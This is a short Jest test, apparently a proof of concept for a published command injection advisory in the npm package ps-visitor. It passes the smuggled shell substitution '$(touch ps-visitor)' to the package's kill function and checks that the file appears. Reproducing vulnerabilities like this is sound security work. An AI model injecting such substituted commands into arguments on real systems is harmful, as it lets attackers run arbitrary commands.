//https://snyk.io/vuln/SNYK-JS-PSVISITOR-1078544
test("Command Injection in ps-visitor", () => 
{
	const ps_visitor = require('ps-visitor');
	const fs = require('fs')
	const path = './ps-visitor'

	ps_visitor.kill('$(touch ps-visitor)');


	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);
});

